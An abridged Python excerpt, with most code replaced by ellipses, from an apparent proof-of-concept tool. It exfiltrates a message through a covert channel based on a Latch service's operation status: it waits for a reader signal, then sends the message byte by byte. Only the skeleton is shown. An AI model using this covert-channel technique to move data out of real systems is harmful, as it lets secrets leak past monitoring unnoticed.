...
class LatchExfiltrationWriter(LatchExfiltration):
    ...
    def __init__(self, message):
        ...
        self.exfiltrateMessage(message)

    # Writer
    def exfiltrateByte(self, bits_string):
        ...
        print('Sending: ' + self.asciiToString(bits_string) + ' ---> ' + bits_string)
...
# CAMBIAR MUCHAS COSAS
    def exfiltrateMessage(self, message):
        print('Writing "' + message + '"...' )
        while not self.latch.getOperationStatus(self.dict_converted.get('reader', '')):
            time.sleep(0.2) 
        message = self.readStringToByte(message) # secret
        for byte in message:
            self.exfiltrateByte(byte)
